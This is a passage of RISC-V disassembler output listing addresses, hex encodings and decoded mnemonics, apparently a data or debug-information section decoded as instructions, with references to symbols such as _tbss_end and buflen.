     fea:	f010                	sd	a2,32(s0)
     fec:	0001                	nop
     fee:	2400                	fld	fs0,8(s0)
     ff0:	3c08                	fld	fa0,56(s0)
     ff2:	7a08                	ld	a0,48(a2)
     ff4:	0002                	c.slli	zero,0x0
     ff6:	0d00                	addi	s0,sp,656
     ff8:	000000db          	0xdb
     ffc:	3e08                	fld	fa0,56(a2)
     ffe:	4909                	li	s2,2
    1000:	0000                	unimp
    1002:	0000                	unimp
    1004:	e50d                	bnez	a0,102e <_tbss_end+0xfaa>
    1006:	0004                	0x4
    1008:	0800                	addi	s0,sp,16
    100a:	0049093f 0d040000 	0xd0400000049093f
    1012:	010e                	slli	sp,sp,0x3
    1014:	0000                	unimp
    1016:	4008                	lw	a0,0(s0)
    1018:	4909                	li	s2,2
    101a:	0000                	unimp
    101c:	0800                	addi	s0,sp,16
    101e:	010d                	addi	sp,sp,3
    1020:	0006                	c.slli	zero,0x1
    1022:	0800                	addi	s0,sp,16
    1024:	0941                	addi	s2,s2,16
    1026:	0049                	c.nop	18
    1028:	0000                	unimp
    102a:	0d0c                	addi	a1,sp,656
    102c:	034d                	addi	t1,t1,19
    102e:	0000                	unimp
    1030:	4208                	lw	a0,0(a2)
    1032:	4909                	li	s2,2
    1034:	0000                	unimp
    1036:	1000                	addi	s0,sp,32
    1038:	db0d                	beqz	a4,f6a <_tbss_end+0xee6>
    103a:	0004                	0x4
    103c:	0800                	addi	s0,sp,16
    103e:	00490943          	fmadd.s	fs2,fs2,ft4,ft0,rne
    1042:	0000                	unimp
    1044:	0d14                	addi	a3,sp,656
    1046:	0570                	addi	a2,sp,652
    1048:	0000                	unimp
    104a:	4408                	lw	a0,8(s0)
    104c:	4909                	li	s2,2
    104e:	0000                	unimp
    1050:	1800                	addi	s0,sp,48
    1052:	f20d                	bnez	a2,f74 <_tbss_end+0xef0>
    1054:	08000003          	lb	zero,128(zero) # 80 <buflen.2991>
    1058:	0945                	addi	s2,s2,17
    105a:	0049                	c.nop	18
    105c:	0000                	unimp
    105e:	0d1c                	addi	a5,sp,656
    1060:	000005ab          	0x5ab
    1064:	4608                	lw	a0,8(a2)
    1066:	4909                	li	s2,2
    1068:	0000                	unimp
    106a:	2000                	fld	fs0,0(s0)
    106c:	1300                	addi	s0,sp,416
    106e:	011d                	addi	sp,sp,7
    1070:	0000                	unimp
    1072:	0208                	addi	a0,sp,256
    1074:	4f08                	lw	a0,24(a4)
    1076:	c008                	sw	a0,0(s0)
    1078:	0002                	c.slli	zero,0x0
    107a:	0d00                	addi	s0,sp,656
    107c:	019f 0000 5008      	0x50080000019f
    1082:	c00a                	sw	sp,0(sp)
    1084:	0002                	c.slli	zero,0x0
    1086:	0000                	unimp
    1088:	2014                	fld	fa3,0(s0)
    108a:	0002                	c.slli	zero,0x0
    108c:	0800                	addi	s0,sp,16
    108e:	0951                	addi	s2,s2,20
    1090:	02c0                	addi	s0,sp,324
    1092:	0000                	unimp
    1094:	0100                	addi	s0,sp,128
    1096:	1714                	addi	a3,sp,928
    1098:	0005                	c.nop	1
    109a:	0800                	addi	s0,sp,16
    109c:	01630a53          	fadd.s	fs4,ft6,fs6,rne
    10a0:	0000                	unimp
    10a2:	0200                	addi	s0,sp,256
    10a4:	4c14                	lw	a3,24(s0)
    10a6:	0001                	nop
    10a8:	0800                	addi	s0,sp,16
    10aa:	0a56                	slli	s4,s4,0x15
    10ac:	00000163          	beqz	zero,10ae <_tbss_end+0x102a>
    10b0:	0204                	addi	s1,sp,256
    10b2:	0a00                	addi	s0,sp,272
    10b4:	0000015b          	0x15b
    10b8:	02d0                	addi	a2,sp,324
    10ba:	0000                	unimp
    10bc:	0000790b          	0x790b
    10c0:	1f00                	addi	s0,sp,944
    10c2:	1300                	addi	s0,sp,416
    10c4:	0356                	slli	t1,t1,0x15
    10c6:	0000                	unimp
    10c8:	0318                	addi	a4,sp,384
    10ca:	6208                	ld	a0,0(a2)
    10cc:	1408                	addi	a0,sp,544
    10ce:	0d000003          	lb	zero,208(zero) # d0 <_tbss_end+0x4c>
    10d2:	0431                	addi	s0,s0,12
    10d4:	0000                	unimp
    10d6:	6308                	ld	a0,0(a4)
    10d8:	1412                	slli	s0,s0,0x24
    10da:	00000003          	lb	zero,0(zero) # 0 <_tdata_begin>
    10de:	490d                	li	s2,3
    10e0:	0004                	0x4
    10e2:	0800                	addi	s0,sp,16
    10e4:	0664                	addi	s1,sp,780
    10e6:	0049                	c.nop	18
    10e8:	0000                	unimp
    10ea:	0d08                	addi	a0,sp,656
    10ec:	000001a7          	0x1a7
    10f0:	6608                	ld	a0,8(a2)
    10f2:	1a09                	addi	s4,s4,-30
    10f4:	10000003          	lb	zero,256(zero) # 100 <_tbss_end+0x7c>
    10f8:	1d14                	addi	a3,sp,688
    10fa:	0001                	nop
    10fc:	0800                	addi	s0,sp,16
    10fe:	027a1e67          	0x27a1e67
    1102:	0000                	unimp
    1104:	0110                	addi	a2,sp,128
    1106:	1200                	addi	s0,sp,288
    1108:	d008                	sw	a0,32(s0)
    110a:	0002                	c.slli	zero,0x0
    110c:	0a00                	addi	s0,sp,272
    110e:	032a                	slli	t1,t1,0xa
    1110:	0000                	unimp
    1112:	032a                	slli	t1,t1,0xa
    1114:	0000                	unimp
    1116:	0000790b          	0x790b
    111a:	1f00                	addi	s0,sp,944
    111c:	1200                	addi	s0,sp,288
    111e:	3008                	fld	fa0,32(s0)
    1120:	15000003          	lb	zero,336(zero) # 150 <_tbss_end+0xcc>
    1124:	fc10                	sd	a2,56(s0)
    1126:	10000003          	lb	zero,256(zero) # 100 <_tbss_end+0x7c>
    112a:	7a08                	ld	a0,48(a2)
    112c:	5908                	lw	a0,48(a0)
    112e:	0d000003          	lb	zero,208(zero) # d0 <_tbss_end+0x4c>
    1132:	0102                	slli	sp,sp,0x0
    1134:	0000                	unimp
    1136:	7b08                	ld	a0,48(a4)
    1138:	5911                	li	s2,-28
    113a:	00000003          	lb	zero,0(zero) # 0 <_tdata_begin>
    113e:	9c0d                	subw	s0,s0,a1
    1140:	0006                	c.slli	zero,0x1
    1142:	0800                	addi	s0,sp,16
    1144:	067c                	addi	a5,sp,780
    1146:	0049                	c.nop	18
    1148:	0000                	unimp
    114a:	0008                	0x8
    114c:	0812                	slli	a6,a6,0x4
    114e:	0034                	addi	a3,sp,8
    1150:	0000                	unimp
    1152:	1b10                	addi	a2,sp,432
    1154:	0004                	0x4
    1156:	b000                	fsd	fs0,32(s0)
    1158:	ba08                	fsd	fa0,48(a2)
    115a:	a208                	fsd	fa0,0(a2)
    115c:	0004                	0x4
    115e:	1100                	addi	s0,sp,160
    1160:	705f 0800 12bb      	0x12bb0800705f
    1166:	0359                	addi	t1,t1,22
    1168:	0000                	unimp
    116a:	1100                	addi	s0,sp,160
    116c:	725f 0800 07bc      	0x7bc0800725f
    1172:	0049                	c.nop	18
    1174:	0000                	unimp
    1176:	1108                	addi	a0,sp,160
    1178:	775f 0800 07bd      	0x7bd0800775f
    117e:	0049                	c.nop	18
    1180:	0000                	unimp
    1182:	0d0c                	addi	a1,sp,656
    1184:	0145                	addi	sp,sp,17
    1186:	0000                	unimp
    1188:	be08                	fsd	fa0,56(a2)
    118a:	3b09                	addiw	s6,s6,-30
    118c:	0000                	unimp
    118e:	1000                	addi	s0,sp,32
    1190:	650d                	lui	a0,0x3
    1192:	0005                	c.nop	1
    1194:	0800                	addi	s0,sp,16
    1196:	003b09bf 11120000 	0x11120000003b09bf
    119e:	625f 0066 c008      	0xc0080066625f
    11a4:	3111                	addiw	sp,sp,-28
    11a6:	18000003          	lb	zero,384(zero) # 180 <_tbss_end+0xfc>
    11aa:	8a0d                	andi	a2,a2,3
    11ac:	0000                	unimp
    11ae:	0800                	addi	s0,sp,16
    11b0:	07c1                	addi	a5,a5,16
    11b2:	0049                	c.nop	18
    11b4:	0000                	unimp
    11b6:	0d28                	addi	a0,sp,664
    11b8:	0135                	addi	sp,sp,13
    11ba:	0000                	unimp
    11bc:	c808                	sw	a0,16(s0)
    11be:	5b0a                	lw	s6,160(sp)
    11c0:	0001                	nop
    11c2:	3000                	fld	fs0,32(s0)
    11c4:	e00d                	bnez	s0,11e6 <_tbss_end+0x1162>
    11c6:	0001                	nop
    11c8:	0800                	addi	s0,sp,16
    11ca:	1dca                	slli	s11,s11,0x32
    11cc:	0626                	slli	a2,a2,0x9
    11ce:	0000                	unimp
    11d0:	0d38                	addi	a4,sp,664
    11d2:	02a1                	addi	t0,t0,8
    11d4:	0000                	unimp
    11d6:	cc08                	sw	a0,24(s0)
    11d8:	501d                	c.li	zero,-25
    11da:	0006                	c.slli	zero,0x1
    11dc:	4000                	lw	s0,0(s0)
    11de:	9e0d                	subw	a2,a2,a1
    11e0:	0004                	0x4
    11e2:	0800                	addi	s0,sp,16
    11e4:	06740dcf          	fnmadd.q	fs11,fs0,ft7,ft0,rne
    11e8:	0000                	unimp
    11ea:	0d48                	addi	a0,sp,660
    11ec:	05c5                	addi	a1,a1,17
    11ee:	0000                	unimp
    11f0:	d008                	sw	a0,32(s0)
    11f2:	8e09                	sub	a2,a2,a0
    11f4:	0006                	c.slli	zero,0x1
    11f6:	5000                	lw	s0,32(s0)
    11f8:	5f11                	li	t5,-28
    11fa:	6275                	lui	tp,0x1d
    11fc:	0800                	addi	s0,sp,16
    11fe:	033111d3          	fadd.d	ft3,ft2,fs3,rtz
    1202:	0000                	unimp
    1204:	1158                	addi	a4,sp,164
    1206:	755f 0070 d408      	0xd4080070755f
    120c:	5912                	lw	s2,36(sp)
    120e:	68000003          	lb	zero,1664(zero) # 680 <_tbss_end+0x5fc>
    1212:	5f11                	li	t5,-28
    1214:	7275                	lui	tp,0xffffd
    1216:	0800                	addi	s0,sp,16
    1218:	07d5                	addi	a5,a5,21
    121a:	0049                	c.nop	18
    121c:	0000                	unimp
    121e:	0d70                	addi	a2,sp,668
    1220:	00fc                	addi	a5,sp,76
    1222:	0000                	unimp
    1224:	d808                	sw	a0,48(s0)
    1226:	9411                	srai	s0,s0,0x24
    1228:	0006                	c.slli	zero,0x1
    122a:	7400                	ld	s0,40(s0)
    122c:	9d0d                	subw	a0,a0,a1
    122e:	0005                	c.nop	1
    1230:	0800                	addi	s0,sp,16
    1232:	11d9                	addi	gp,gp,-10
    1234:	06a4                	addi	s1,sp,840
    1236:	0000                	unimp
    1238:	6c5f1177          	0x6c5f1177
    123c:	0062                	c.slli	zero,0x18
    123e:	dc08                	sw	a0,56(s0)
    1240:	3111                	addiw	sp,sp,-28
    1242:	78000003          	lb	zero,1920(zero) # 780 <_tbss_end+0x6fc>
    1246:	670d                	lui	a4,0x3
    1248:	0001                	nop
    124a:	0800                	addi	s0,sp,16
    124c:	07df 0049 0000      	0x4907df
    1252:	0d88                	addi	a0,sp,720
    1254:	0178                	addi	a4,sp,140
    1256:	0000                	unimp
    1258:	e008                	sd	a0,0(s0)
    125a:	d50a                	sw	sp,168(sp)
    125c:	0000                	unimp
    125e:	9000                	0x9000
    1260:	5f0d                	li	t5,-29
    1262:	0006                	c.slli	zero,0x1
    1264:	0800                	addi	s0,sp,16
    1266:	04c012e3          	bne	zero,a2,1aaa <_tbss_end+0x1a26>
    126a:	0000                	unimp
    126c:	0d98                	addi	a4,sp,720
    126e:	0288                	addi	a0,sp,320
    1270:	0000                	unimp
    1272:	e708                	sd	a0,8(a4)
    1274:	7b0c                	ld	a1,48(a4)
    1276:	0001                	nop
    1278:	a000                	fsd	fs0,0(s0)
    127a:	230d                	addiw	t1,t1,3
    127c:	0004                	0x4
    127e:	0800                	addi	s0,sp,16
    1280:	0ee9                	addi	t4,t4,26
    1282:	0000014f          	fnmadd.s	ft2,ft0,ft0,ft0,rne
    1286:	0da4                	addi	s1,sp,728
    1288:	028e                	slli	t0,t0,0x3
    128a:	0000                	unimp
    128c:	ea08                	sd	a0,16(a2)
    128e:	4909                	li	s2,2
    1290:	0000                	unimp
    1292:	ac00                	fsd	fs0,24(s0)
    1294:	1600                	addi	s0,sp,800
    1296:	00ed                	addi	ra,ra,27
    1298:	0000                	unimp
    129a:	04c0                	addi	s0,sp,580
    129c:	0000                	unimp
    129e:	0004c017          	auipc	zero,0x4c
    12a2:	1700                	addi	s0,sp,928
    12a4:	0000015b          	0x15b
    12a8:	00061417          	auipc	s0,0x61
    12ac:	1700                	addi	s0,sp,928
    12ae:	0049                	c.nop	18
    12b0:	0000                	unimp
    12b2:	1200                	addi	s0,sp,288
    12b4:	cb08                	sw	a0,16(a4)
    12b6:	0004                	0x4
    12b8:	0500                	addi	s0,sp,640
    12ba:	04c0                	addi	s0,sp,580
    12bc:	0000                	unimp
    12be:	8118                	0x8118
    12c0:	0004                	0x4
    12c2:	4800                	lw	s0,16(s0)
    12c4:	02650807          	0x2650807
    12c8:	1408                	addi	a0,sp,544
    12ca:	0006                	c.slli	zero,0x1
    12cc:	1900                	addi	s0,sp,176
    12ce:	03e1                	addi	t2,t2,24
    12d0:	0000                	unimp
    12d2:	6708                	ld	a0,8(a4)
    12d4:	0702                	slli	a4,a4,0x0
    12d6:	0049                	c.nop	18
    12d8:	0000                	unimp
    12da:	1900                	addi	s0,sp,176
    12dc:	0154                	addi	a3,sp,132
    12de:	0000                	unimp
    12e0:	6c08                	ld	a0,24(s0)
    12e2:	0b02                	slli	s6,s6,0x0
    12e4:	0700                	addi	s0,sp,896
    12e6:	0000                	unimp
    12e8:	1908                	addi	a0,sp,176
    12ea:	0208                	addi	a0,sp,256
    12ec:	0000                	unimp
    12ee:	6c08                	ld	a0,24(s0)
    12f0:	1402                	slli	s0,s0,0x20
    12f2:	0700                	addi	s0,sp,896
    12f4:	0000                	unimp
    12f6:	1910                	addi	a2,sp,176
    12f8:	01c1                	addi	gp,gp,16
    12fa:	0000                	unimp
    12fc:	6c08                	ld	a0,24(s0)
    12fe:	1e02                	slli	t3,t3,0x20
    1300:	0700                	addi	s0,sp,896
    1302:	0000                	unimp
    1304:	1918                	addi	a4,sp,176
    1306:	0444                	addi	s1,sp,516
    1308:	0000                	unimp
    130a:	6e08                	ld	a0,24(a2)
    130c:	0802                	slli	a6,a6,0x0
    130e:	0049                	c.nop	18
    1310:	0000                	unimp
    1312:	1920                	addi	s0,sp,184
    1314:	002a                	c.slli	zero,0xa
    1316:	0000                	unimp
    1318:	6f08                	ld	a0,24(a4)
    131a:	0802                	slli	a6,a6,0x0
    131c:	0909                	addi	s2,s2,2
    131e:	0000                	unimp
    1320:	1924                	addi	s1,sp,184
    1322:	0460                	addi	s0,sp,524
    1324:	0000                	unimp
    1326:	7208                	ld	a0,32(a2)
    1328:	0702                	slli	a4,a4,0x0
    132a:	0049                	c.nop	18
    132c:	0000                	unimp
    132e:	1940                	addi	s0,sp,180
    1330:	044e                	slli	s0,s0,0x13
    1332:	0000                	unimp
    1334:	7308                	ld	a0,32(a4)
    1336:	1602                	slli	a2,a2,0x20
    1338:	091e                	slli	s2,s2,0x7
    133a:	0000                	unimp
    133c:	1948                	addi	a0,sp,180
    133e:	0368                	addi	a0,sp,396
    1340:	0000                	unimp
    1342:	7508                	ld	a0,40(a0)
    1344:	0702                	slli	a4,a4,0x0
    1346:	0049                	c.nop	18
    1348:	0000                	unimp
    134a:	1950                	addi	a2,sp,180
    134c:	0456                	slli	s0,s0,0x15
    134e:	0000                	unimp
    1350:	7708                	ld	a0,40(a4)
    1352:	0a02                	slli	s4,s4,0x0
    1354:	0000092f          	0x92f
    1358:	1958                	addi	a4,sp,180
    135a:	00000273          	0x273
    135e:	7a08                	ld	a0,48(a2)
    1360:	1302                	slli	t1,t1,0x20
    1362:	01e1                	addi	gp,gp,24
    1364:	0000                	unimp
    1366:	1960                	addi	s0,sp,188
    1368:	01e6                	slli	gp,gp,0x19
    136a:	0000                	unimp
    136c:	7b08                	ld	a0,48(a4)
    136e:	0702                	slli	a4,a4,0x0
    1370:	0049                	c.nop	18
    1372:	0000                	unimp
    1374:	1968                	addi	a0,sp,188
    1376:	05ed                	addi	a1,a1,27
    1378:	0000                	unimp
    137a:	7c08                	ld	a0,56(s0)
    137c:	1302                	slli	t1,t1,0x20
    137e:	01e1                	addi	gp,gp,24
    1380:	0000                	unimp
    1382:	1970                	addi	a2,sp,188
    1384:	039a                	slli	t2,t2,0x6
    1386:	0000                	unimp
    1388:	7d08                	ld	a0,56(a0)
    138a:	1402                	slli	s0,s0,0x20
    138c:	0935                	addi	s2,s2,13
    138e:	0000                	unimp
    1390:	1978                	addi	a4,sp,188
    1392:	0210                	addi	a2,sp,256
    1394:	0000                	unimp
    1396:	8008                	0x8008
    1398:	0702                	slli	a4,a4,0x0
    139a:	0049                	c.nop	18
    139c:	0000                	unimp
    139e:	1980                	addi	s0,sp,240
    13a0:	0170                	addi	a2,sp,140
    13a2:	0000                	unimp
    13a4:	8108                	0x8108
    13a6:	0902                	slli	s2,s2,0x0
    13a8:	0614                	addi	a3,sp,768
    13aa:	0000                	unimp
    13ac:	1988                	addi	a0,sp,240
    13ae:	03da                	slli	t2,t2,0x16
    13b0:	0000                	unimp
    13b2:	a408                	fsd	fa0,8(s0)
    13b4:	0702                	slli	a4,a4,0x0
    13b6:	000008e3          	beqz	zero,1bc6 <_tbss_end+0x1b42>
    13ba:	1a90                	addi	a2,sp,368
    13bc:	0356                	slli	t1,t1,0x15
    13be:	0000                	unimp
    13c0:	a808                	fsd	fa0,16(s0)
    13c2:	1302                	slli	t1,t1,0x20
    13c4:	0314                	addi	a3,sp,384
    13c6:	0000                	unimp
    13c8:	01f8                	addi	a4,sp,204
    13ca:	461a                	lw	a2,132(sp)
    13cc:	0002                	c.slli	zero,0x0
    13ce:	0800                	addi	s0,sp,16
    13d0:	02a9                	addi	t0,t0,10
    13d2:	d012                	sw	tp,32(sp)
    13d4:	0002                	c.slli	zero,0x0
    13d6:	0000                	unimp
    13d8:	1a02                	slli	s4,s4,0x20
    13da:	00000593          	li	a1,0
    13de:	ad08                	fsd	fa0,24(a0)
    13e0:	0c02                	slli	s8,s8,0x0
    13e2:	0946                	slli	s2,s2,0x11
    13e4:	0000                	unimp
    13e6:	0518                	addi	a4,sp,640
    13e8:	3d1a                	fld	fs10,416(sp)
    13ea:	0001                	nop
    13ec:	0800                	addi	s0,sp,16
    13ee:	02b2                	slli	t0,t0,0xc
    13f0:	c110                	sw	a2,0(a0)
    13f2:	0006                	c.slli	zero,0x1
    13f4:	2000                	fld	fs0,0(s0)
    13f6:	1a05                	addi	s4,s4,-31
    13f8:	0118                	addi	a4,sp,128
    13fa:	0000                	unimp
    13fc:	b408                	fsd	fa0,40(s0)
    13fe:	0a02                	slli	s4,s4,0x0
    1400:	0952                	slli	s2,s2,0x14
    1402:	0000                	unimp
    1404:	0538                	addi	a4,sp,648
    1406:	1200                	addi	s0,sp,288
    1408:	1a08                	addi	a0,sp,304
    140a:	0006                	c.slli	zero,0x1
    140c:	0200                	addi	s0,sp,256
    140e:	0801                	addi	a6,a6,0
    1410:	03cc                	addi	a1,sp,452
    1412:	0000                	unimp
    1414:	1a05                	addi	s4,s4,-31
    1416:	0006                	c.slli	zero,0x1
    1418:	1200                	addi	s0,sp,288
    141a:	a208                	fsd	fa0,0(a2)
    141c:	0004                	0x4
    141e:	1600                	addi	s0,sp,800
    1420:	00ed                	addi	ra,ra,27
    1422:	0000                	unimp
    1424:	064a                	slli	a2,a2,0x12
    1426:	0000                	unimp
    1428:	0004c017          	auipc	zero,0x4c
    142c:	1700                	addi	s0,sp,928
    142e:	0000015b          	0x15b
    1432:	00064a17          	auipc	s4,0x64
    1436:	1700                	addi	s0,sp,928
    1438:	0049                	c.nop	18
    143a:	0000                	unimp
    143c:	1200                	addi	s0,sp,288
    143e:	2108                	fld	fa0,0(a0)
    1440:	0006                	c.slli	zero,0x1
    1442:	1200                	addi	s0,sp,288
    1444:	2c08                	fld	fa0,24(s0)
    1446:	0006                	c.slli	zero,0x1
    1448:	1600                	addi	s0,sp,800
    144a:	00e1                	addi	ra,ra,24
    144c:	0000                	unimp
    144e:	0674                	addi	a3,sp,780
    1450:	0000                	unimp
    1452:	0004c017          	auipc	zero,0x4c
    1456:	1700                	addi	s0,sp,928
    1458:	0000015b          	0x15b
    145c:	0000e117          	auipc	sp,0xe
    1460:	1700                	addi	s0,sp,928
    1462:	0049                	c.nop	18
    1464:	0000                	unimp
    1466:	1200                	addi	s0,sp,288
    1468:	5608                	lw	a0,40(a2)
    146a:	0006                	c.slli	zero,0x1
    146c:	1600                	addi	s0,sp,800
    146e:	0049                	c.nop	18
    1470:	0000                	unimp
    1472:	068e                	slli	a3,a3,0x3
    1474:	0000                	unimp
    1476:	0004c017          	auipc	zero,0x4c
    147a:	1700                	addi	s0,sp,928
    147c:	0000015b          	0x15b
    1480:	1200                	addi	s0,sp,288
    1482:	7a08                	ld	a0,48(a2)
    1484:	0006                	c.slli	zero,0x1
    1486:	0a00                	addi	s0,sp,272
    1488:	0034                	addi	a3,sp,8
    148a:	0000                	unimp
    148c:	06a4                	addi	s1,sp,840
    148e:	0000                	unimp
    1490:	0000790b          	0x790b
    1494:	0200                	addi	s0,sp,256
    1496:	0a00                	addi	s0,sp,272
    1498:	0034                	addi	a3,sp,8
    149a:	0000                	unimp
    149c:	06b4                	addi	a3,sp,840
    149e:	0000                	unimp
    14a0:	0000790b          	0x790b
    14a4:	0000                	unimp
    14a6:	0700                	addi	s0,sp,896
    14a8:	0409                	addi	s0,s0,2
    14aa:	0000                	unimp
    14ac:	2408                	fld	fa0,8(s0)
    14ae:	1a01                	addi	s4,s4,-32
    14b0:	035f 0000 7a1b      	0x7a1b0000035f
    14b6:	0005                	c.nop	1
    14b8:	1800                	addi	s0,sp,48
    14ba:	2808                	fld	fa0,16(s0)
    14bc:	0801                	addi	a6,a6,0
    14be:	06fa                	slli	a3,a3,0x1e
    14c0:	0000                	unimp
    14c2:	3119                	addiw	sp,sp,-26
    14c4:	0004                	0x4
    14c6:	0800                	addi	s0,sp,16
    14c8:	012a                	slli	sp,sp,0xa
    14ca:	fa11                	bnez	a2,13de <_tbss_end+0x135a>
    14cc:	0006                	c.slli	zero,0x1
    14ce:	0000                	unimp
    14d0:	2c19                	addiw	s8,s8,6
    14d2:	0002                	c.slli	zero,0x0
    14d4:	0800                	addi	s0,sp,16
    14d6:	4907012b          	0x4907012b
    14da:	0000                	unimp
    14dc:	0800                	addi	s0,sp,16
    14de:	0319                	addi	t1,t1,6
    14e0:	0004                	0x4
    14e2:	0800                	addi	s0,sp,16
    14e4:	012c                	addi	a1,sp,136
    14e6:	0007000b          	0x7000b
    14ea:	1000                	addi	s0,sp,32
    14ec:	1200                	addi	s0,sp,288
    14ee:	c108                	sw	a0,0(a0)
    14f0:	0006                	c.slli	zero,0x1
    14f2:	1200                	addi	s0,sp,288
    14f4:	b408                	fsd	fa0,40(s0)
    14f6:	0006                	c.slli	zero,0x1
    14f8:	1b00                	addi	s0,sp,432
    14fa:	0022                	c.slli	zero,0x8
    14fc:	0000                	unimp
    14fe:	080e                	slli	a6,a6,0x3
    1500:	0144                	addi	s1,sp,132
    1502:	3f08                	fld	fa0,56(a4)
    1504:	19000007          	0x19000007
    1508:	0488                	addi	a0,sp,576
    150a:	0000                	unimp
    150c:	4508                	lw	a0,8(a0)
    150e:	1201                	addi	tp,tp,-32
    1510:	0000073f 04ff1900 	0x4ff19000000073f
    1518:	0000                	unimp
    151a:	4608                	lw	a0,8(a2)
    151c:	1201                	addi	tp,tp,-32
    151e:	0000073f 05201906 	0x52019060000073f
    1526:	0000                	unimp
    1528:	4708                	lw	a0,8(a4)
    152a:	1201                	addi	tp,tp,-32
    152c:	0042                	c.slli	zero,0x10
    152e:	0000                	unimp
    1530:	000c                	0xc
    1532:	420a                	lw	tp,128(sp)
    1534:	0000                	unimp
    1536:	4f00                	lw	s0,24(a4)
    1538:	0b000007          	0xb000007
    153c:	0079                	c.nop	30
    153e:	0000                	unimp
    1540:	0002                	c.slli	zero,0x0
    1542:	d81c                	sw	a5,48(s0)
    1544:	8508                	0x8508
    1546:	0702                	slli	a4,a4,0x0
    1548:	0864                	addi	s1,sp,28
    154a:	0000                	unimp
    154c:	5819                	li	a6,-26
    154e:	0005                	c.nop	1
    1550:	0800                	addi	s0,sp,16
    1552:	5f180287          	0x5f180287
    1556:	0000                	unimp
    1558:	0000                	unimp
    155a:	0519                	addi	a0,a0,6
    155c:	0005                	c.nop	1
    155e:	0800                	addi	s0,sp,16
    1560:	0288                	addi	a0,sp,320
    1562:	1412                	slli	s0,s0,0x24
    1564:	0006                	c.slli	zero,0x1
    1566:	0800                	addi	s0,sp,16
    1568:	6619                	lui	a2,0x6
    156a:	0002                	c.slli	zero,0x0
    156c:	0800                	addi	s0,sp,16
    156e:	0289                	addi	t0,t0,2
    1570:	6410                	ld	a2,8(s0)
    1572:	0008                	0x8
    1574:	1000                	addi	s0,sp,32
    1576:	b619                	j	107c <_tbss_end+0xff8>
    1578:	0005                	c.nop	1
    157a:	0800                	addi	s0,sp,16
    157c:	028a                	slli	t0,t0,0x2
    157e:	0001f717          	auipc	a4,0x1f
    1582:	2c00                	fld	fs0,24(s0)
    1584:	d119                	beqz	a0,148a <_tbss_end+0x1406>
    1586:	0001                	nop
    1588:	0800                	addi	s0,sp,16
    158a:	490f028b          	0x490f028b
    158e:	0000                	unimp
    1590:	5000                	lw	s0,32(s0)
    1592:	2c19                	addiw	s8,s8,6
    1594:	0004                	0x4
    1596:	0800                	addi	s0,sp,16
    1598:	028c                	addi	a1,sp,320
    159a:	742c                	ld	a1,104(s0)
    159c:	0008                	0x8
    159e:	5800                	lw	s0,48(s0)
    15a0:	cc19                	beqz	s0,15be <_tbss_end+0x153a>
    15a2:	0005                	c.nop	1
    15a4:	0800                	addi	s0,sp,16
    15a6:	028d                	addi	t0,t0,3
    15a8:	061a                	slli	a2,a2,0x6
    15aa:	60000007          	0x60000007
    15ae:	3719                	addiw	a4,a4,-26
    15b0:	0004                	0x4
    15b2:	0800                	addi	s0,sp,16
    15b4:	028e                	slli	t0,t0,0x3
    15b6:	4f16                	lw	t5,68(sp)
    15b8:	0001                	nop
    15ba:	7000                	ld	s0,32(s0)
    15bc:	d719                	beqz	a4,14ca <_tbss_end+0x1446>
    15be:	0005                	c.nop	1
    15c0:	0800                	addi	s0,sp,16
    15c2:	4f16028f          	0x4f16028f
    15c6:	0001                	nop
    15c8:	7800                	ld	s0,48(s0)
    15ca:	cd19                	beqz	a0,15e8 <_tbss_end+0x1564>
    15cc:	0000                	unimp
    15ce:	0800                	addi	s0,sp,16
    15d0:	0290                	addi	a2,sp,320
    15d2:	4f16                	lw	t5,68(sp)
    15d4:	0001                	nop
    15d6:	8000                	0x8000
    15d8:	8919                	andi	a0,a0,6
    15da:	0005                	c.nop	1
    15dc:	0800                	addi	s0,sp,16
    15de:	0291                	addi	t0,t0,4
    15e0:	7b10                	ld	a2,48(a4)
    15e2:	0008                	0x8
    15e4:	8800                	0x8800
    15e6:	5a19                	li	s4,-26
    15e8:	0002                	c.slli	zero,0x0
    15ea:	0800                	addi	s0,sp,16
    15ec:	0292                	slli	t0,t0,0x4
    15ee:	8b10                	0x8b10
    15f0:	0008                	0x8
    15f2:	9000                	0x9000
    15f4:	2d19                	addiw	s10,s10,6
    15f6:	0005                	c.nop	1
    15f8:	0800                	addi	s0,sp,16
    15fa:	490f0293          	addi	t0,t5,1168
    15fe:	0000                	unimp
    1600:	a800                	fsd	fs0,16(s0)
    1602:	9119                	srli	a0,a0,0x26
    1604:	0001                	nop
    1606:	0800                	addi	s0,sp,16
    1608:	0294                	addi	a3,sp,320
    160a:	4f16                	lw	t5,68(sp)
    160c:	0001                	nop
    160e:	ac00                	fsd	fs0,24(s0)
    1610:	b619                	j	1116 <_tbss_end+0x1092>
    1612:	0000                	unimp
    1614:	0800                	addi	s0,sp,16
    1616:	0295                	addi	t0,t0,5
    1618:	4f16                	lw	t5,68(sp)
    161a:	0001                	nop
    161c:	b400                	fsd	fs0,40(s0)
    161e:	8019                	srli	s0,s0,0x6
    1620:	0001                	nop
    1622:	0800                	addi	s0,sp,16
    1624:	0296                	slli	t0,t0,0x5
    1626:	4f16                	lw	t5,68(sp)
    1628:	0001                	nop
    162a:	bc00                	fsd	fs0,56(s0)
    162c:	5319                	li	t1,-26
    162e:	0000                	unimp
    1630:	0800                	addi	s0,sp,16
    1632:	4f160297          	auipc	t0,0x4f160
    1636:	0001                	nop
    1638:	c400                	sw	s0,8(s0)
    163a:	6219                	lui	tp,0x6
    163c:	0000                	unimp
    163e:	0800                	addi	s0,sp,16
    1640:	0298                	addi	a4,sp,320
    1642:	4f16                	lw	t5,68(sp)
    1644:	0001                	nop
    1646:	cc00                	sw	s0,24(s0)
    1648:	df19                	beqz	a4,1566 <_tbss_end+0x14e2>
    164a:	08000003          	lb	zero,128(zero) # 4d4f6 <_tbss_end+0x4d472>
    164e:	0299                	addi	t0,t0,6
    1650:	4908                	lw	a0,16(a0)
    1652:	0000                	unimp
    1654:	d400                	sw	s0,40(s0)
    1656:	0a00                	addi	s0,sp,272
    1658:	061a                	slli	a2,a2,0x6
    165a:	0000                	unimp
    165c:	0874                	addi	a3,sp,28
    165e:	0000                	unimp
    1660:	0000790b          	0x790b
    1664:	1900                	addi	s0,sp,176
    1666:	0200                	addi	s0,sp,256
    1668:	0708                	addi	a0,sp,896
    166a:	00000073          	ecall
    166e:	1a0a                	slli	s4,s4,0x22
    1670:	0006                	c.slli	zero,0x1
    1672:	8b00                	0x8b00
    1674:	0008                	0x8
    1676:	0b00                	addi	s0,sp,400
    1678:	0079                	c.nop	30
    167a:	0000                	unimp
    167c:	1a0a0007          	0x1a0a0007
    1680:	0006                	c.slli	zero,0x1
    1682:	9b00                	0x9b00
    1684:	0008                	0x8
